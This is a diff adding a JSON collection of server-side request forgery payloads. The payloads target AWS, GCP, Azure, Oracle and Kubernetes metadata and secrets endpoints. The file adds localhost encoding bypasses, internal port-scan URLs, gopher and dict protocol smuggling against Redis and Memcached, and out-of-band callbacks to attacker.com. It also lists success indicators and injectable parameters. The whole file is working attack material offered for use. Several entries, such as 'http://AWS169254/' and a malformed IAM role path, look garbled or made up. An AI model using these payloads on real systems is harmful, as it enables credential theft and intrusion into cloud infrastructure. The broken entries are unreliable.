@@ -1,0 +1,139 @@
+{
+  "info": {
+    "name": "SSRF Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "Comprehensive SSRF payloads for cloud metadata exfiltration, internal port scanning, and blind SSRF detection. 2026 updated.",
+    "category": "Injection",
+    "severity": "CRITICAL",
+    "owasp": "A10:2021 - Server-Side Request Forgery"
+  },
+  "payloads": {
+    "aws_metadata": [
+      {"url": "http://169.254.169.254/latest/meta-data/", "description": "AWS meta-data root", "type": "metadata", "provider": "aws"},
+      {"url": "http://169.254.169.254/latest/meta-data/ami-id", "description": "AWS AMI ID", "type": "metadata", "provider": "aws"},
+      {"url": "http://169.254.169.254/latest/meta-data/instance-id", "description": "AWS instance ID", "type": "metadata", "provider": "aws"},
+      {"url": "http://169.254.169.254/latest/meta-data/instance-type", "description": "AWS instance type", "type": "metadata", "provider": "aws"},
+      {"url": "http://169.254.169.254/latest/meta-data/local-ipv4", "description": "AWS local IP", "type": "metadata", "provider": "aws"},
+      {"url": "http://169.254.169.254/latest/meta-data/public-ipv4", "description": "AWS public IP", "type": "metadata", "provider": "aws"},
+      {"url": "http://169.254.169.254/latest/meta-data/security-credentials/", "description": "AWS credentials path", "type": "credentials", "provider": "aws"},
+      {"url": "http://169.254.169.254/latest/meta-data/security-credentials/$aws_iam_.amazonaws.com", "description": "AWS IAM role creds", "type": "credentials", "provider": "aws"},
+      {"url": "http://169.254.169.254/latest/user-data/", "description": "AWS user data", "type": "userdata", "provider": "aws"},
+      {"url": "http://169.254.169.254/latest/dynamic/instance-identity/document", "description": "AWS instance identity", "type": "metadata", "provider": "aws"},
+      {"url": "http://169.254.169.254/latest/dynamic/instance-identity/signature", "description": "AWS instance signature", "type": "metadata", "provider": "aws"},
+      {"url": "http://169.254.169.254/latest/api/token", "description": "AWS IMDSv2 token", "type": "metadata", "provider": "aws"},
+      {"url": "http://AWS169254/", "description": "AWS hostname bypass", "type": "bypass", "provider": "aws"}
+    ],
+    "gcp_metadata": [
+      {"url": "http://metadata.google.internal/computeMetadata/v1/", "description": "GCP metadata root", "type": "metadata", "provider": "gcp"},
+      {"url": "http://metadata.google.internal/computeMetadata/v1/instance/hostname", "description": "GCP hostname", "type": "metadata", "provider": "gcp"},
+      {"url": "http://metadata.google.internal/computeMetadata/v1/instance/id", "description": "GCP instance ID", "type": "metadata", "provider": "gcp"},
+      {"url": "http://metadata.google.internal/computeMetadata/v1/instance/zone", "description": "GCP zone", "type": "metadata", "provider": "gcp"},
+      {"url": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/", "description": "GCP attributes", "type": "metadata", "provider": "gcp"},
+      {"url": "http://metadata.google.internal/computeMetadata/v1/project/attributes/", "description": "GCP project attributes", "type": "metadata", "provider": "gcp"},
+      {"url": "http://metadata.google.internal/computeMetadata/v1/project/project-id", "description": "GCP project ID", "type": "metadata", "provider": "gcp"},
+      {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "description": "GCP service account token", "type": "credentials", "provider": "gcp"},
+      {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email", "description": "GCP service account email", "type": "credentials", "provider": "gcp"},
+      {"url": "http://100.100.100.200/latest/meta-data/", "description": "Alibaba metadata", "type": "metadata", "provider": "alibaba"},
+      {"url": "http://100.100.100.200/latest/meta-data/instance-id", "description": "Alibaba instance ID", "type": "metadata", "provider": "alibaba"}
+    ],
+    "azure_metadata": [
+      {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "description": "Azure metadata root", "type": "metadata", "provider": "azure"},
+      {"url": "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01", "description": "Azure compute info", "type": "metadata", "provider": "azure"},
+      {"url": "http://169.254.169.254/metadata/instance/network/interface?api-version=2021-02-01", "description": "Azure network info", "type": "metadata", "provider": "azure"},
+      {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=text", "description": "Azure metadata text", "type": "metadata", "provider": "azure"},
+      {"url": "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01", "description": "Azure attested doc", "type": "metadata", "provider": "azure"},
+      {"url": "http://169.254.169.254/metadata/identity/info?api-version=2021-02-01", "description": "Azure MI info", "type": "metadata", "provider": "azure"}
+    ],
+    "digitalocean_metadata": [
+      {"url": "http://169.254.169.254/metadata/v1.json", "description": "DO metadata root", "type": "metadata", "provider": "digitalocean"},
+      {"url": "http://169.254.169.254/metadata/v1/id", "description": "DO droplet ID", "type": "metadata", "provider": "digitalocean"},
+      {"url": "http://169.254.169.254/metadata/v1/hostname", "description": "DO hostname", "type": "metadata", "provider": "digitalocean"},
+      {"url": "http://169.254.169.254/metadata/v1/user-data", "description": "DO user data", "type": "userdata", "provider": "digitalocean"},
+      {"url": "http://169.254.169.254/metadata/v1/vendor_data", "description": "DO vendor data", "type": "userdata", "provider": "digitalocean"}
+    ],
+    "kubernetes": [
+      {"url": "http://kubernetes.default.svc/api/v1/namespaces/default/pods", "description": "K8s list pods", "type": "k8s", "provider": "kubernetes"},
+      {"url": "http://kubernetes.default.svc/api/v1/secrets", "description": "K8s list secrets", "type": "k8s", "provider": "kubernetes"},
+      {"url": "http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets", "description": "K8s kube-system secrets", "type": "k8s", "provider": "kubernetes"},
+      {"url": "http://kubernetes.default.svc/api/v1/services", "description": "K8s list services", "type": "k8s", "provider": "kubernetes"},
+      {"url": "http://kubernetes.default.svc/api/v1/namespaces/default/configmaps", "description": "K8s configmaps", "type": "k8s", "provider": "kubernetes"}
+    ],
+    "oracle_cloud": [
+      {"url": "http://192.0.0.192/latest/", "description": "Oracle metadata root", "type": "metadata", "provider": "oracle"},
+      {"url": "http://192.0.0.192/latest/instance-id", "description": "Oracle instance ID", "type": "metadata", "provider": "oracle"},
+      {"url": "http://192.0.0.192/latest/userData", "description": "Oracle user data", "type": "userdata", "provider": "oracle"}
+    ],
+    "internal_localhost": [
+      {"url": "http://localhost/", "description": "Localhost", "type": "local", "provider": "generic"},
+      {"url": "http://127.0.0.1/", "description": "127.0.0.1", "type": "local", "provider": "generic"},
+      {"url": "http://[::1]/", "description": "IPv6 localhost", "type": "local", "provider": "generic"},
+      {"url": "http://0.0.0.0/", "description": "0.0.0.0", "type": "local", "provider": "generic"},
+      {"url": "http://127.1/", "description": "Short localhost", "type": "local", "provider": "generic"},
+      {"url": "http://2130706433/", "description": "Decimal localhost", "type": "bypass", "provider": "generic"},
+      {"url": "http://0177.0000.0000.0001/", "description": "Octal localhost", "type": "bypass", "provider": "generic"},
+      {"url": "http://0x7f.0x1/", "description": "Hex localhost", "type": "bypass", "provider": "generic"}
+    ],
+    "internal_port_scan": [
+      {"url": "http://localhost:22/", "description": "SSH port", "type": "port_scan", "provider": "generic"},
+      {"url": "http://localhost:3306/", "description": "MySQL port", "type": "port_scan", "provider": "generic"},
+      {"url": "http://localhost:5432/", "description": "PostgreSQL port", "type": "port_scan", "provider": "generic"},
+      {"url": "http://localhost:6379/", "description": "Redis port", "type": "port_scan", "provider": "generic"},
+      {"url": "http://localhost:27017/", "description": "MongoDB port", "type": "port_scan", "provider": "generic"},
+      {"url": "http://localhost:11211/", "description": "Memcached port", "type": "port_scan", "provider": "generic"},
+      {"url": "http://localhost:9200/", "description": "Elasticsearch port", "type": "port_scan", "provider": "generic"},
+      {"url": "http://localhost:8443/", "description": "HTTPS alt port", "type": "port_scan", "provider": "generic"},
+      {"url": "http://localhost:8080/", "description": "HTTP alt port", "type": "port_scan", "provider": "generic"},
+      {"url": "http://localhost:5000/", "description": "Dev server port", "type": "port_scan", "provider": "generic"}
+    ],
+    "dns_rebinding": [
+      {"url": "http://attacker.com.127.0.0.1.attacker.com/", "description": "DNS rebind basic", "type": "dns_rebind", "provider": "generic"},
+      {"url": "http://[::1]:80/", "description": "IPv6 loopback", "type": "bypass", "provider": "generic"},
+      {"url": "http://[0:0:0:0:0:ffff:127.0.0.1]/", "description": "IPv4-mapped IPv6", "type": "bypass", "provider": "generic"}
+    ],
+    "bypass_techniques": [
+      {"url": "http://127.0.0.1#@localhost/", "description": "Fragment bypass", "type": "bypass", "provider": "generic"},
+      {"url": "http://localhost.@127.0.0.1/", "description": "At-symbol bypass", "type": "bypass", "provider": "generic"},
+      {"url": "http://localhost.127.0.0.1.nip.io/", "description": "nip.io bypass", "type": "bypass", "provider": "generic"},
+      {"url": "http://127.0.0.1.1.this.little.piggy.bank/", "description": "DNS rebind loopback", "type": "bypass", "provider": "generic"},
+      {"url": "http://0000::1:80/", "description": "IPv6 mixed notation", "type": "bypass", "provider": "generic"},
+      {"url": "http://localhost%23@127.0.0.1/", "description": "URL encoded @ bypass", "type": "bypass", "provider": "generic"}
+    ],
+    "protocol_smuggling": [
+      {"url": "dict://localhost:11211/stats", "description": "Memcached DICT protocol", "type": "protocol", "provider": "generic"},
+      {"url": "gopher://localhost:6379/_INFO", "description": "Redis Gopher", "type": "protocol", "provider": "generic"},
+      {"url": "gopher://localhost:6379/_KEYS%20*", "description": "Redis Gopher keys", "type": "protocol", "provider": "generic"},
+      {"url": "sftp://localhost:22/", "description": "SFTP protocol", "type": "protocol", "provider": "generic"},
+      {"url": "smb://localhost/", "description": "SMB protocol", "type": "protocol", "provider": "generic"},
+      {"url": "ldap://localhost:389/", "description": "LDAP protocol", "type": "protocol", "provider": "generic"},
+      {"url": "ftp://localhost/", "description": "FTP protocol", "type": "protocol", "provider": "generic"}
+    ]
+  },
+  "blind_ssrf_callbacks": [
+    {"url": "http://oob-test.attacker.com/", "description": "OOB callback test", "type": "oob"},
+    {"url": "http://burpcollaborator.net/", "description": "Burp Collaborator", "type": "oob"},
+    {"url": "http://dnslog.cn/", "description": "DNS log test", "type": "dns_oob"},
+    {"url": "http://ceye.io/lookup?hostname=", "description": "CEYE monitoring", "type": "oob"},
+    {"url": "http://interact.sh/", "description": "Interact.sh", "type": "oob"}
+  ],
+  "success_indicators": {
+    "aws": ["ami-", "i-", "t2.", "m5.", "c5."],
+    "gcp": ["google", "project", "zone", "instance"],
+    "azure": ["vmId", "subscriptionId", "resourceGroupName"],
+    "kubernetes": ["apiVersion", "kind", "metadata", "items"],
+    "local": ["root:x:", "bin:x:", "daemon:x:", "nobody:x:"],
+    "memcached": ["STAT", "END"],
+    "redis": ["+OK", "redis_version"]
+  },
+  "parameters": [
+    "url", "src", "dest", "redirect", "uri", "path", "proxy", "fetch", "load",
+    "endpoint", "link", "domain", "host", "site", "callback", "return",
+    "feed", "target", "api", "server", "resource", "open", "navigation",
+    "next", "data", "validate", "reference", "q", "html", "val", "validate",
+    "window", "out", "view", "dir", "show", "port", "to", "out", "tb", "data"
+  ],
+  "header_injection_targets": [
+    "X-Forwarded-For", "X-Client-IP", "X-Real-IP", "Host",
+    "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr"
+  ]
+}
